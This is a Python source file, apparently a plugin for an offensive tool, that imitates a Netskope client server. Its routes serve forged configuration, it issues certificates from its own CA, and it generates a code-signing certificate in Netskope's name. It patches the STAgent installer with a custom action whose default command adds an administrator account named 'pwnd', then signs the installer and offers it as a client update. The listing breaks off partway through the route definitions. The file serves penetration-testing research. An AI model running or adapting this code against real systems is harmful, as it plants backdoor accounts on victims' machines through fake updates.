from nachovpn.plugins import VPNPlugin
from flask import Response, abort, request, send_file, jsonify
from nachovpn.plugins.paloalto.msi_patcher import get_msi_patcher

import subprocess
import shutil
import os
import time
import jwt
import random
import string
import hashlib
import base64
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import pkcs12
from datetime import datetime, timedelta, timezone
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID, ObjectIdentifier


class NetskopePlugin(VPNPlugin):
    def __init__(self, *args, **kwargs):
        # provide the templates directory relative to this plugin
        super().__init__(*args, **kwargs, template_dir=os.path.join(os.path.dirname(__file__), 'templates'))

        # Payload storage
        self.payload_dir = os.path.join(os.getcwd(), 'payloads')
        self.files_dir = os.path.join(os.path.dirname(__file__), 'files')
        self.cache_dir = os.path.join(os.getcwd(), 'cache')
        os.makedirs(self.payload_dir, exist_ok=True)
        os.makedirs(self.cache_dir, exist_ok=True)

        # Payload options
        self.msi_force_patch = os.getenv("NETSKOPE_MSI_FORCE_PATCH", False)
        self.msi_force_download = os.getenv("NETSKOPE_MSI_FORCE_DOWNLOAD", False)
        self.msi_add_file = os.getenv("NETSKOPE_MSI_ADD_FILE", None)
        self.msi_increment_version = os.getenv("NETSKOPE_MSI_INCREMENT_VERSION", True)
        self.msi_command = os.getenv(
            "NETSKOPE_MSI_COMMAND",
            r"net user pwnd Passw0rd123! /add && net localgroup administrators pwnd /add"
        )

        # Certificate paths
        self.codesign_cert_path = os.path.join('certs', 'netskope-codesign.cer')
        self.codesign_key_path = os.path.join('certs', 'netskope-codesign.key')
        self.codesign_pfx_path = os.path.join('certs', 'netskope-codesign.pfx')

        # Tenant config
        self.tenant_config = {
            "orgkey": os.getenv("NETSKOPE_ORGKEY", self.random_string(20)),
            "tenant_id": os.getenv("NETSKOPE_TENANT_ID", self.random_int(1000, 9999)),
            "tenant_name": os.getenv("NETSKOPE_TENANT_NAME", "TestOrg"),
            "region": os.getenv("NETSKOPE_REGION", "eu"),
            "pop_name": os.getenv("NETSKOPE_POP_NAME", "UK-LON1"),
            "addon_manager_host": os.getenv("NETSKOPE_ADDON_MANAGER_HOST", self.dns_name),
            "enrollment_host": os.getenv("NETSKOPE_ENROLLMENT_HOST", self.dns_name),
            "addon_checker_host": os.getenv("NETSKOPE_ADDON_CHECKER_HOST", self.dns_name),
            "sf_checker_host": os.getenv("NETSKOPE_SF_CHECKER_HOST", self.dns_name),        # sfchecker.goskope.com
            "npa_gateway_host": os.getenv("NETSKOPE_NPA_GATEWAY_HOST", self.dns_name),      # gateway.npa.goskope.com
            "nsgw_host": os.getenv("NETSKOPE_NSGW_HOST", self.dns_name),                    # gateway-<tenant_name>.eu.goskope.com
            "nsgw_backup_host": os.getenv("NETSKOPE_NSGW_BACKUP_HOST", self.dns_name),      # gateway-backup-<tenant_name>.eu.goskope.com
            "gslb_gateway_host": os.getenv("NETSKOPE_GSLB_GATEWAY_HOST", self.dns_name),    # gateway.gslb.goskope.com
            "npa_host": os.getenv("NETSKOPE_NPA_HOST", self.dns_name),                      # ns-<tenant_id>.nl-am2.npa.goskope.com
            "stitcher_host": os.getenv("NETSKOPE_STITCHER_HOST", self.dns_name),            # stitcher.npa.goskope.com
            "dp_gateway_fqdn": os.getenv("NETSKOPE_DP_GATEWAY_FQDN", self.dns_name),        # gateway-lon2.goskope.com
            "user_email": os.getenv("NETSKOPE_USER_EMAIL", "test.user@example.com"),
            "user_key": os.getenv("NETSKOPE_USER_KEY", self.random_string(20)),
            "client_version": os.getenv("NETSKOPE_CLIENT_VERSION", "200.0.0.2272"),
            "client_hash": self.random_hash("sha1"),
        }

        if not self.bootstrap():
            self.logger.error(f"Failed to bootstrap. Disabling {self.__class__.__name__}")
            self.enabled = False

    def random_string(self, length=20):
        return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=length))

    def random_int(self, min=1, max=10000):
        return random.randint(min, max)

    def random_hash(self, algorithm="md5"):
        h = hashlib.new(algorithm)
        h.update(self.random_string().encode())
        return h.hexdigest().upper()

    def sign_msi_files(self):
        if not os.path.exists(self.codesign_cert_path):
            self.logger.error("Windows code signing certificate not found, skipping signing")
            return False

        if not os.path.exists(os.path.join(self.payload_dir, "STAgent.msi")):
            self.logger.error("MSI file not found, skipping signing")
            return False

        if os.name == "nt":
            self.logger.error("Windows MSI signing not supported yet")
            return False

        if not os.path.exists('/usr/bin/osslsigncode'):
            self.logger.error("osslsigncode not found, skipping signing")
            return False

        # Sign the MSI files
        for msi_file in ["STAgent.msi"]:
            input_file = os.path.join(self.payload_dir, msi_file)
            output_file = os.path.join(self.payload_dir, f"{msi_file}.signed")

            # Remove existing signed file
            if os.path.exists(output_file):
                os.remove(output_file)

            proc = subprocess.run([
                "/usr/bin/osslsigncode", "sign", "-pkcs12", self.codesign_pfx_path,
                "-h", "sha256", "-in", input_file, "-out", output_file,
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            if proc.returncode or not os.path.exists(output_file):
                self.logger.error(f"Failed to sign {msi_file}: {proc.returncode}")
                return False
            else:
                self.logger.info(f"Signed {msi_file}")
                os.replace(output_file, input_file)
        return True

    def verify_msi_files(self):
        # Verify that the MSI files are signed by our current CA
        if os.name == "nt":
            self.logger.error("Windows MSI verification not supported yet")
            return True

        if os.name == "posix" and not os.path.exists('/usr/bin/osslsigncode'):
            self.logger.error("osslsigncode not found, skipping verification")
            return True

        for msi_file in ["STAgent.msi"]:
            proc = subprocess.run([
                "/usr/bin/osslsigncode", "verify", "-CAfile", self.cert_manager.ca_cert_path,
                "-in", os.path.join(self.payload_dir, msi_file),
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            if proc.returncode:
                self.logger.error(f"Failed to verify {msi_file}: {proc.returncode}")
                return False

        self.logger.info("MSI file verified")
        return True

    def patch_msi_files(self):
        # Patch the msi files
        if os.path.exists(os.path.join(self.payload_dir, "STAgent.msi")) and \
           not self.msi_force_patch and self.verify_msi_files():
            self.logger.warning("MSI file already patched, skipping")
            return True

        if os.name == "posix" and not os.path.exists('/usr/bin/msidump'):
            self.logger.error("msitools not found, skipping patching")
            return True

        # Check if MSI files are present
        if not os.path.exists(os.path.join(self.files_dir, "STAgent.msi")):
            self.logger.warning(f"MSI file not found in files directory: {self.files_dir}")
            return False

        patcher = get_msi_patcher()

        for msi_file in ["STAgent.msi"]:
            # Copy default MSI file to payload directory
            input_file = os.path.join(self.files_dir, msi_file)
            output_file = os.path.join(self.payload_dir, msi_file)
            shutil.copy(input_file, output_file)

            # Add patches
            if self.msi_add_file:
                patcher.add_file(output_file, self.msi_add_file, self.random_hash(), "DefaultFeature")
                self.logger.info(f"Added file {self.msi_add_file} to {msi_file}")

            if self.msi_command:
                patcher.add_custom_action(output_file, f"_{self.random_hash()}", 50, 
                                          "C:\\windows\\system32\\cmd.exe", f"/c {self.msi_command}", 
                                          "InstallExecuteSequence")
                self.logger.info(f"Added custom action to {msi_file}")

            # Set the MSI version
            patcher.set_msi_version(output_file, self.tenant_config["client_version"])
            self.logger.info(f"Set MSI version for {msi_file}")

            # Add CERT_DIGEST property
            # Not validated, but it's required by the STAgent service
            cert_digest = base64.b64encode(os.urandom(256)).decode()
            patcher.add_custom_property(output_file, "CERT_DIGEST", cert_digest)
            self.logger.info(f"Added CERT_DIGEST property to {msi_file}")

        self.logger.info("MSI file patched")
        return True

    def get_org_cert(self):
        return self.get_ca_cert()

    def get_ca_cert(self):
        with open(self.cert_manager.ca_cert_path, 'r') as f:
            return f.read()

    def get_user_cert(self):
        # Generate a private key for the user certificate
        user_private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )

        # Create the code signing certificate
        subject = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, self.tenant_config["user_email"]),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, self.tenant_config["tenant_name"]),
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, os.urandom(16).hex()),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "London"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "GB"),
            x509.NameAttribute(NameOID.COUNTRY_NAME, "GB"),
            x509.NameAttribute(NameOID.EMAIL_ADDRESS, self.tenant_config["user_email"]),
        ])

        eku_list = [
            ExtendedKeyUsageOID.CLIENT_AUTH,
        ]

        key_usage = x509.KeyUsage(
            digital_signature=True,
            key_encipherment=True,
            content_commitment=False,
            data_encipherment=False,
            key_agreement=True,
            encipher_only=False,
            decipher_only=False,
            key_cert_sign=False,
            crl_sign=False
        )

        builder = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            self.cert_manager.ca_cert.subject
        ).public_key(
            user_private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.now(timezone.utc) - timedelta(days=1)
        ).not_valid_after(
            datetime.now(timezone.utc) + timedelta(days=365)
        ).add_extension(
            x509.ExtendedKeyUsage(eku_list),
            critical=True,
        ).add_extension(
            key_usage,
            critical=True,
        )

        # Sign the certificate with the CA private key
        user_certificate = builder.sign(self.cert_manager.ca_key, hashes.SHA256(), default_backend())

        # Convert to pkcs12
        user_p12 = serialization.pkcs12.serialize_key_and_certificates(
            b"user",
            user_private_key,
            user_certificate,
            None,
            serialization.NoEncryption())

        self.logger.info(f"Generated user certificate for {self.tenant_config['user_email']}")
        return user_p12

    def bootstrap(self):
        # Generate a Windows code signing certificate
        if not os.path.exists(self.codesign_cert_path) or not os.path.exists(self.codesign_key_path):
            self.cert_manager.generate_codesign_certificate(
                common_name="netSkope, Inc.",
                cert_path=self.codesign_cert_path,
                key_path=self.codesign_key_path,
                pfx_path=self.codesign_pfx_path
            )

        # Load the CA certificate into the tenant config
        with open(self.cert_manager.ca_cert_path, 'r') as f:
            self.tenant_config["ca_certificate"] = f.read()

        # Patch the Windows MSI file and sign it
        if not self.patch_msi_files():
            return False
        if not self.sign_msi_files():
            return False
        return True

    def can_handle_http(self, handler):
        user_agent = handler.headers.get('User-Agent', '')
        if 'Netskope ST Agent' in user_agent or \
           handler.path in ["/nsauth/client/authenticate", "/netskope/generate_command"]:
            return True
        return False

    def timestamp(self):
        return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")

    def request_id(self):
        return base64.urlsafe_b64encode(os.urandom(15)).decode()

    def version_hex(self):
        return os.urandom(6).hex()[:5]

    def _setup_routes(self):
        # Call the parent class's route setup
        super()._setup_routes()

        @self.flask_app.route("/", methods=["GET"])
        def index():
            return jsonify({"access-method" : "Client"})

        @self.flask_app.route("/v1/externalhost", methods=["GET"])
        def externalhost():
            data = {
                "status": "success",
                "hosts": {
                    "enrollment": self.tenant_config["enrollment_host"]
                    },
                "enabled": "true"
                }
            return jsonify(data)

        @self.flask_app.route("/adconfig", methods=["GET"])
        def adconfig():
            return jsonify({"secureUPN": "0", "status": "success"})

        @self.flask_app.route("/client/supportlogging", methods=["POST"])
        def support_logging():
            return jsonify({"status": "success"})

        @self.flask_app.route("/config/user/getbrandingbyemail", methods=["GET"])
        def getbrandingbyemail():
            orgkey = request.args.get('orgkey', self.tenant_config["orgkey"])
            data = {
                "AddonCheckerHost": self.tenant_config["addon_checker_host"],
                "AddonCheckerResponseCode": "netSkope@netSkope",
                "AddonManagerHost": self.tenant_config["addon_manager_host"],
                "EncryptBranding": False,
                "OrgKey": orgkey,
                "OrgName": self.tenant_config["tenant_name"],
                "SFCheckerHost": self.tenant_config["sf_checker_host"],
                "SFCheckerIP": "8.8.8.8",
                "UserEmail": self.tenant_config["user_email"],
                "UserKey": self.tenant_config["user_key"],
                "ValidateConfig": False,
                "status": "success",
                "tenantID": self.tenant_config["tenant_id"]
                }
            return jsonify(data)

        @self.flask_app.route("/v1/branding/tenant/<tenant>", methods=["GET"])
        def brandingtenant(tenant):
            jwt = request.headers.get('Authorization')
            data = {
                "encrypted": False,
                "nonce": "",
                "branding": {
                    "AddonCheckerHost": self.tenant_config["addon_checker_host"],
                    "AddonCheckerResponseCode": "netSkope@netSkope",
                    "AddonManagerHost": self.tenant_config["addon_manager_host"],
                    "EncryptBranding": False,
                    "OrgKey": self.tenant_config["orgkey"],
                    "OrgName": self.tenant_config["tenant_name"],
                    "SFCheckerHost": self.tenant_config["sf_checker_host"],
                    "SFCheckerIP": "8.8.8.8",
                    "UserEmail": self.tenant_config["user_email"],
                    "UserKey": self.tenant_config["user_key"],
                    "ValidateConfig": False,
                    "status": "success",
                    "tenantID": self.tenant_config["tenant_id"]
                }
            }
            return jsonify(data)

        @self.flask_app.route("/v2/config/org/clientconfig", methods=["GET"])
        def clientconfig():
            userconfig = request.args.get('userconfig', "0")
            tenantconfig = request.args.get('tenantconfig', "0")
            data = {}
            if tenantconfig == "1":
                data = {
                    "IDPModeOnlyIfConfigured": "0",
                    "MDMSecureEnrollmentTokenEnabled": "1",
                    "OverrideAccessMethodDetection": "0",
                    "add_os_and_access_method_to_ssl_decryption": "1",
                    "advance_firewall_enabled": "0",
                    "alert_acknowledge": "0",
                    "allowClientDisabling": "true",
                    "allowIdPLogout": "false",
                    "allowNpaDisabling": "true",
                    "allowOnetimeClientDisabling": "0",
                    "allow_autouninstall": "0",
                    "alwaysOnDemandVPN": "0",
                    "always_send_nsdeviceuid_new": "1",
                    "always_send_nsdeviceuid_new_v2": "1",
                    "android_chromeos_ns_client": "0",
                    "app_instance_management_enabled": "0",
                    "blockDnsTCP": "0",
                    "blockIPv6": "0",
                    "bwanclient": "0",
                    "bwanenrollmenturl": "",
                    "bypassApp": "1",
                    "bypassLoopbackDNS": "1",
                    "bypassOfficeAppsAtAndroidOS": "0",
                    "bypassPacDownloadFlow": "0",
                    "bypassPreferredIPv4macOS": "0",
                    "bypassPrivateTrafficAtDriver": "0",
                    "case_sensitive_groups": "0",
                    "cert_pinned_app_decryption_enabled": "0",
                    "cfg_ver_usr_update_check": "0",
                    "checkCiscoVpn": "0",
                    "checkSNI": "false",
                    "check_msi_digest": "0",
                    "clientAssistedGSLBGTM": "1",
                    "clientAssistedGTM": "1",
                    "clientEncryptBranding": "0",
                    "clientHandleOverlappingDomains": "0",
                    "clientStatusEnableBatching": "0",
                    "clientStatusUpdate": {
                        "heartbeatIntervalInMin": "30"
                    },
                    "clientStatusUpdateIntervalInMin": "5",
                    "clientUninstall": {
                        "allowUninstall": "true"
                    },
                    "clientUpdate": {
                        "allowAutoGoldenUpdate": "false",
                        "allowAutoUpdate": "true",
                        "showUpdateNotification": "false",
                        "updateIntervalInMin": "1"
                    },
                    "client_config_post_v2": "0",
                    "configUpdate": {
                        "updateIntervalInMin": "1"
                    },
                    "configurationName": "Test Client Configuration",
                    "custom_email_sending_domain": "0",
                    "dc_cert_check_crl_support_enabled": "0",
                    "dc_cert_check_sc_support_enabled": "0",
                    "dc_custom_label_enabled": "1",
                    "debugSettings": "true",
                    "demClientAppProbeLimit": "10",
                    "demDeviceHealthIntervalInMin": "0",
                    "demDpRouteControlCollectInterval": "0",
                    "demStationAppProbeLimit": "30",
                    "demTopConsumptionMetrics": "0",
                    "dem_active_station_limit": "0",
                    "dem_app_probes_max_limit": "0",
                    "dem_custom_apps_max_limit": "0",
                    "dem_network_path_probes_max_limit": "0",
                    "demconfig_host": "",
                    "dest-ip-policy": "0",
                    "deviceUniqueID": "1",
                    "device_admin": {
                        "auto_start_prelogin_tunnel": "false",
                        "cert_ca": [],
                        "data": "",
                        "prelogin_username": "",
                        "show_prelogon_status": "true",
                        "validate_crl": "false"
                    },
                    "device_classification_av_os_checks_enabled": "1",
                    "device_classification_cert_check_enabled": "0",
                    "device_classification_ui_improvements": "1",
                    "disableFirefoxPopup": "0",
                    "disableJavaDnsCache": "0",
                    "disableMacCannotAllocateCheck": "0",
                    "disable_appssoagent_restart": "0",
                    "dlp_unique_count_enabled": "1",
                    "dns_custom_port": "0",
                    "drop_svcb_dns_resolver_query": "1",
                    "duplicateRccDataToGEF": "0",
                    "dynamicSteering": "1",
                    "dynamicSteeringImprovementEnabled": "1",
                    "email_svc_v2_tenant_feature": "1",
                    "enableAOACSupport": "1",
                    "enableAirDropException": "0",
                    "enableClientSelfProtection": "false",
                    "enableDemClientStatus": "0",
                    "enableDemHeartbeat": "1",
                    "enableMacOSInterfaceBinding": "0",
                    "enableMacPerformance": "0",
                    "enableMacPerformance_v2": "0",
                    "enableSaveBatteryForSleepMode": "0",
                    "enableTLSKey": "0",
                    "enableTunnelSessionNotFound": "0",
                    "enableUpdatePropertyFrameSupport": "1",
                    "enable_case_insensitivity": "0",
                    "enable_dc_smart_card_insertion_detection": "0",
                    "enable_deep_custom_category_fetching": "0",
                    "enable_dem_npa_private_apps": "0",
                    "enable_mongo_maria_sync_tenant": "1",
                    "enable_scim_custom_attributes": "0",
                    "enable_scim_custom_attributes_event_enrichment": "0",
                    "enable_um_mongo_sync": "0",
                    "encryptClientConfig": "0",
                    "endpoint_dlp": "0",
                    "endpoint_dlp_cd_dvd": "0",
                    "endpoint_dlp_content_bluetooth": "0",
                    "endpoint_dlp_content_network": "0",
                    "endpoint_dlp_content_printer": "0",
                    "endpoint_dlp_device_encryption": "0",
                    "endpoint_dlp_enabled": "0",
                    "endpoint_dlp_mac_bluetooth_device_control": "1",
                    "endpoint_dlp_macos_content_control_settings": "0",
                    "endpoint_dlp_ui_mip_profiles_warning": "0",
                    "endpoint_dlp_ui_otp_enabled": "0",
                    "enhancedCertPinnedApplist": "1",
                    "enhanced_reports": "1",
                    "enhanced_reports_feature_start_date": "2025-01-01 00:00:00",
                    "enhanced_reports_migration_period": "90",
                    "enhanced_reports_pre_migration_period": "90",
                    "enhanced_reports_start_date": "2025-01-01 00:00:00",
                    "epdlp_mp": "",
                    "eventForwarderHost": "",
                    "event_incident_enabled": "0",
                    "ext_urp_enabled": "0",
                    "externalProxy": [],
                    "externalProxyConfig": "1",
                    "failClose": {
                        "captive_portal_timeout": "",
                        "exclude_npa": "false",
                        "fail_close": "false",
                        "notification": "false"
                    },
                    "fail_close_enabled": "1",
                    "fast_fetch_enabled": "0",
                    "featureActivationExpiry": "0",
                    "feature_ios_client_download": "0",
                    "feature_mongo_client_secondary_allowed": "0",
                    "forward_to_proxy_settings": "0",
                    "gslb": {
                        "host": self.tenant_config["gslb_gateway_host"],
                        "port": "443"
                    },
                    "gsuite_mailclient_enabled": "0",
                    "handleExceptionsAtDriver": "0",
                    "handleSNIFromSegmentPacket": "0",
                    "hideClientIcon": "false",
                    "hide_client_after": "50",
                    "ignoreInactiveSystemProxy": "0",
                    "ignoreLoopbackProxy": "0",
                    "ignore_cert_chain_certs": "1",
                    "industry_comparison_enabled": "1",
                    "injectAtTransportLayer": 0,
                    "inline_policy_enhancements_enabled": "1",
                    "interopProxy": {
                        "host": "",
                        "port": 0,
                        "product": 0
                    },
                    "ios_vpn_mode": "1",
                    "isClientSTA": "1",
                    "large_file_support": "0",
                    "linuxBypassRouteIPException": "0",
                    "localTrafficBypass": "1",
                    "logLevel": "info",
                    "master_passcode_for_client_disablement": "0",
                    "mdm_secure_enrollment": "1",
                    "metrics": {
                        "enable": "0"
                    },
                    "mongo_user_info_flag": "1",
                    "mtu": "1476",
                    "ng_device_classification_enabled": "0",
                    "notBypassBlockedCertpinnedAppOnSession0": "0",
                    "npa": {
                        "dnstcp_enabled": "1",
                        "dtls_enabled": "0",
                        "gslb": {
                            "host": self.tenant_config["gslb_gateway_host"],
                            "port": "443"
                        },
                        "host": self.tenant_config["npa_gateway_host"],
                        "keepalive_timeout": 15,
                        "lb_host": "",
                        "npa_local_broker_v1": "0",
                        "port": 443,
                        "port_bypass_enabled": "0",
                        "rfc1918_enabled": "0",
                        "tenant": self.tenant_config["npa_host"]
                    },
                    "npa_4k_pvkey_cert": "0",
                    "npa_appdiscovery_host_limit": "32",
                    "npa_auth_client_enrollment_enabled": "0",
                    "npa_client_allow_disable": "1",
                    "npa_client_bypass_local_subnet_disabled": "0",
                    "npa_client_compose_device_user_id": "0",
                    "npa_client_l4": "0",
                    "npa_client_use_cgnat": "0",
                    "npa_docker_support": "0",
                    "npa_enable_tls_cipher_aes128_only": "1",
                    "npa_enable_wildcard_app_validation": "0",
                    "npa_gslb_client": "0",
                    "npa_gslb_client_no_fallback": "0",
                    "npa_gslb_client_pop_count": "10",
                    "npa_gslb_client_v2": "0",
                    "npa_gslb_client_v3": "1",
                    "npa_handle_dns_https_query": "0",
                    "npa_lz4_support": "0",
                    "npa_max_dns_search_domains": "0",
                    "npa_srp_compress": "0",
                    "npa_srpv2": "1",
                    "npa_srpv2_configdist": "1",
                    "nsclient_api_security_no_enc": "0",
                    "nsgw": {
                        "backupHost": self.tenant_config["nsgw_backup_host"],
                        "host": self.tenant_config["nsgw_host"],
                        "port": 443
                    },
                    "onpremcheck": {
                        "onprem_additional_http_hosts": [],
                        "onprem_additional_ips": [],
                        "onprem_host": "",
                        "onprem_http_host": "",
                        "onprem_http_tcp_connection_timeout": "",
                        "onprem_ip": "",
                        "onprem_use_dns": ""
                    },
                    "overrideUserDisableAfterLogin": "0",
                    "partner_orange": "0",
                    "pdem_subscription_level": "None",
                    "policy_group_count_max": "1024",
                    "postureValidation": {
                        "periodic_validation_enabled": "true",
                        "validation": {
                            "interval": 60
                        }
                    },
                    "posture_validation_enabled": "1",
                    "prc_dp_geofence": "0",
                    "prc_dp_npa_tenant": "0",
                    "prc_dp_premium_npa_tenant": "0",
                    "prc_dp_tenant": "0",
                    "prelogin_enabled": "false",
                    "premium_reports": "1",
                    "premium_reports_licensing_status": "1",
                    "premium_reports_licensing_status_start_date": "2025-01-01 00:00:00",
                    "premium_reports_migration_period": "0",
                    "premium_reports_ns_superadmin_access_only": "0",
                    "premium_reports_trial_period": "0",
                    "priority": 0,
                    "privateApps": {
                        "npa_vdi_support": "false",
                        "npa_vdi_user": "",
                        "partner_access": "false",
                        "partner_tenant_access": "false",
                        "partner_tenant_info": [],
                        "primary_tenant_name": "",
                        "reauth_enabled": "false",
                        "seamless_policy_update": "true"
                    },
                    "protocol": "dtls",
                    "proxyAuth": "0",
                    "proxy_chaining_enabled": "0",
                    "publisher_selection": "0",
                    "push_tenant_ca_cert_key": "1",
                    "reconfigureUser": "1",
                    "remove_source_steering_exception": "0",
                    "reportClientStatus": "0",
                    "scim_attribute_control": "0",
                    "scim_delete_disabled_user": "1",
                    "scim_group_members": "0",
                    "scim_mongo_case_insensitive_query": "1",
                    "scim_nested_group_support": "0",
                    "secureAccess": "1",
                    "secure_config_validation": "0",
                    "secure_enrollment_encryption_token_enabled": "1",
                    "secure_enrollment_multiple_token_support_enabled": "0",
                    "secure_enrollment_token_decoupling_enabled": "1",
                    "sendDeviceInfo": "false",
                    "service_profile_v2_enabled": "0",
                    "sfCheck": {
                        "SFCheckerHost": self.tenant_config["sf_checker_host"],
                        "SFCheckerIP": "8.8.8.8",
                        "SFCheckerIP6": "2001:4860:4860:8888"
                    },
                    "simple_client_notification_enabled": "1",
                    "sites_enabled": "1",
                    "steer_all_cloud_apps": "0",
                    "steering_categories_api_v2": "0",
                    "steering_config_2": "1",
                    "steering_domains_api_v2": "0",
                    "steering_dynamicdomains_api_v2": "0",
                    "steering_dynamicexceptions_api_v2": "0",
                    "steering_dynamicpinnedapps_api_v2": "0",
                    "steering_exceptions_api_v2": "0",
                    "steering_match_criteria_improvements": "0",
                    "steering_orgpac_api_v2": "0",
                    "steering_pac_api_v2": "0",
                    "steering_pinnedapps_api_v2": "0",
                    "steering_post_api_v2": "0",
                    "steering_private_apps_api_v2": "0",
                    "steering_v2_enabled": "0",
                    "stopTunnelOnSleep": "0",
                    "storage_constraint_profile_api_rate_limit": "10",
                    "supportUDPExceptions": "0",
                    "support_more_tlv": "1",
                    "support_ou_group_exceptions": "1",
                    "synchronous_scim_server": "1",
                    "traffic_mode": "web",
                    "transaction_logs_enabled": "1",
                    "uba_enabled": "0",
                    "um_api_service_migration_high_usage": "0",
                    "um_api_service_migration_low_usage": "0",
                    "um_api_service_migration_medium_usage": "0",
                    "um_clear_all_cache_async": "0",
                    "um_clear_steering_cache": "0",
                    "unified_ios_client": "1",
                    "urp_enabled": "0",
                    "useConfigVersion": "0",
                    "useSerialNumberAsHostname": "0",
                    "useWebView2": "1",
                    "use_custom_primary_identifier_user": "0",
                    "userNotification": "1",
                    "user_manager_api_enabled": "0",
                    "user_manager_for_group_memberships": "0",
                    "user_manager_object_lock": "0",
                    "validate_email_format": "1",
                    "validateusertenant": "0",
                    "versioned_steering": "1"
                }
            elif userconfig == "1":
                data = {
                    "autoUninstall": "0",
                    "onpremcheck": {
                        "onprem_additional_http_hosts": [],
                        "onprem_additional_ips": [],
                        "onprem_host": "",
                        "onprem_http_host": "",
                        "onprem_http_tcp_connection_timeout": "",
                        "onprem_ip": "",
                        "onprem_use_dns": ""
                    },
                    "privateApps": {
                        "reauth": {
                            "grace_period": 0,
                            "interval": 0
                        },
                        "reauth_enabled": "false"
                    }
                }
            return jsonify(data)

        @self.flask_app.route("/config/getoverlappingdomainlist", methods=["GET"])
        def getoverlappingdomainlist():
            data = {
                "overlappingDomainList": {
                    "1": [
                        "example.co.uk"
                    ],
                    "2": [
                        "example.net"
                    ],
                    "3": [
                        "example.org"
                    ],
                    "4": [
                        "example.com"
                    ]
                },
                "status": "OK"
            }
            return jsonify(data)

        @self.flask_app.route("/client/deviceclassification", methods=["POST"])
        def deviceclassification():
            data = {
                "status": "success",
                "latest_modified_time": self.timestamp(),
                "deviceClassification": [
                    [
                        "Test Laptops"
                    ],
                    [
                        -2
                    ]
                ]
            }
            return jsonify(data)

        @self.flask_app.route("/v2/update/clientstatus", methods=["POST"])
        def clientstatus():
            data = {"status": "success"}
            return jsonify(data)

        @self.flask_app.route("/v2/checkupdate", methods=["GET"])
        def checkupdate():
            os = request.args.get('os')
            client_hash = self.tenant_config["client_hash"]
            client_version = self.tenant_config["client_version"]
            data = {}
            if os == "win":
                data = {
                    "version": client_version,
                    "downloadurl": f"https://{self.dns_name}/dlr/{client_hash}?version={client_version}",
                    "upload_timestamp": int(time.time())
                }
            return jsonify(data)

        @self.flask_app.route("/api/clients", methods=["POST"])
        def clients():
            data = {"errors":["token jti not valid"]}
            return jsonify(data), 401

        @self.flask_app.route("/api/v0.2/footprint/<id>", methods=["GET", "POST"])
        def footprint(id):
            data = {}
            # TODO: fetch or minimise this data
            if request.method == "GET":
                data = {
                    "egress_ip": "1.2.3.4",
                    "request_id": self.request_id(),
                    "scope": "default",
                    "version": self.version_hex(),
                    "rtt_protocol": "tcp",
                    "client_country": "GB",
                    "pops": [
                        {
                            "name": self.tenant_config["pop_name"],
                            "distance": 10.91245919002901,
                            "rtt_endpoints": [
                                {
                                    "ip": self.external_ip,
                                    "port": 443,
                                    "scheme": "http",
                                    "path": "/"
                                },
                            ],
                            "country": "GB",
                            "in_country": True,
                            "dp_gateway_fqdn": self.tenant_config["dp_gateway_fqdn"],
                            "ip_address": self.external_ip
                        }
                    ]
                }
            elif request.method == "POST":
                data = {
                    "egress_ip": "1.2.3.4",
                    "request_id": self.request_id(),
                    "scope": "default",
                    "pops": [
                        {
                            "name": self.tenant_config["pop_name"],
                            "ip": self.external_ip
                        }
                    ]
                }
            return jsonify(data)

        @self.flask_app.route("/api/v0.2/npa/footprint/<id>", methods=["GET", "POST"])
        def npa_footprint(id):
            data = {}
            if request.method == "GET":
                data = {
                    "egress_ip": "1.2.3.4",
                    "request_id": self.request_id(),
                    "scope": "npa",
                    "version": self.version_hex(),
                    "rtt_protocol": "tcp",
                    "client_country": "GB",
                    "pops": [
                        {
                            "name": self.tenant_config["pop_name"],
                            "distance": 10.91245919002901,
                            "rtt_endpoints": [
                                {
                                    "ip": self.external_ip,
                                    "port": 443,
                                    "scheme": "http",
                                    "path": "/"
                                },
                                {
                                    "ip": self.external_ip,
                                    "port": 443,
                                    "scheme": "http",
                                    "path": "/"
                                }
                            ],
                            "country": "GB",
                            "in_country": True,
                            "npa_gateway_fqdn": self.tenant_config["npa_gateway_host"],
                            "npa_stitcher_fqdn": self.tenant_config["stitcher_host"],
                            "npa_gateway_ip": self.external_ip,
                            "npa_stitcher_ip": self.external_ip
                        }
                    ]
                }
            elif request.method == "POST":
                data = {
                    "egress_ip": "1.2.3.4",
                    "request_id": self.request_id(),
                    "scope": "npa",
                    "pops": [
                        {
                            "name": self.tenant_config["pop_name"],
                            "npa_gateway_ip": self.external_ip,
                            "npa_gateway_fqdn": self.tenant_config["npa_gateway_host"],
                            "npa_stitcher_ip": self.external_ip,
                            "npa_stitcher_fqdn": self.tenant_config["stitcher_host"],
                            "country": "GB",
                            "in_country": True
                        }
                    ]
                }
            return jsonify(data)

        @self.flask_app.route("/steering/categories", methods=["GET"])
        def steering_categories():
            data = {
                "status": "success",
                "steering_config_name": "Test Steering Configuration",
                "webcat_ids": []
            }
            return jsonify(data)

        @self.flask_app.route("/v2/config/org/getmanagedchecks", methods=["GET"])
        def getmanagedchecks():
            data = {
                "device_classification_rules": {
                    "win": {
                        "domain_check": {
                            "domains": [
                                "nachovpn.local"
                            ]
                        }
                    }
                },
                "latest_modified_time": self.timestamp()
            }
            return jsonify(data)

        @self.flask_app.route("/steering/pinnedapps", methods=["GET"])
        def pinnedapps():
            data = {
                "certPinnedAppList": [],
                "status": "success",
                "steering_config_name": "Test Steering Configuration"
            }
            return jsonify(data)

        @self.flask_app.route("/steering/exceptions", methods=["GET"])
        def steering_exceptions():
            data = {
                "fail_close": {
                    "domains": [],
                    "ips": []
                },
                "ips": [],
                "names": [],
                "protocols": {},
